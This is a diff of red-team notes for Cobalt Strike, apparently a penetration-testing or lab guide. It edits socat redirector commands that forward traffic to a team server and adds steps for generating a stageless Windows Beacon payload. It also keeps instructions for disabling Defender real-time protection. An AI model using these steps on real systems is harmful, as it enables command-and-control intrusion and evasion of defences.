@@ -125,8 +125,8 @@ Redirector 3 - DNS (long haul)
 sudo -i
 apt-get install -y socat
 screen -S lee
-socat tcp4-listen:443,fork tcp4:<team server IP>:443 &        Redirector 1/2
-socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53 &     Redirector 3
+socat tcp4-listen:443,fork tcp4:<team server IP>:443        Redirector 1/2
+socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53     Redirector 3
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Valid SSL certificate for Beacon 
@@ -178,7 +178,7 @@ Change the Pipename
 Save
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Scripted Web Delivery (S)
+# Payloads
 
 OPSEC: staged payloads tend to have more indicators compared to stageless.
 Always prefer a fully staged or stageless payload and disable payload staging.
@@ -188,7 +188,7 @@ Always prefer a fully staged or stageless payload and disable payload staging.
 Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
 Standard: Windows Defender settings > turn off Real-time protection
 
-- Generate a payload
+- Attack 1
 Attacks > Scripted Web Delivery (S)
 URI Path: /a
 Listener: select the https listener > Choose
@@ -198,6 +198,17 @@ Launch > OK
 
 Transfer the payload to your target and execute.
 Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
+
+- Attack 2
+Payloads > Windows Stageless Payload
+Listener: select the https listener > Choose
+Output: Raw
+x64: Use x64 payload
+Generate > Save > OK
+
+
+
+
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Interact with a Beacon
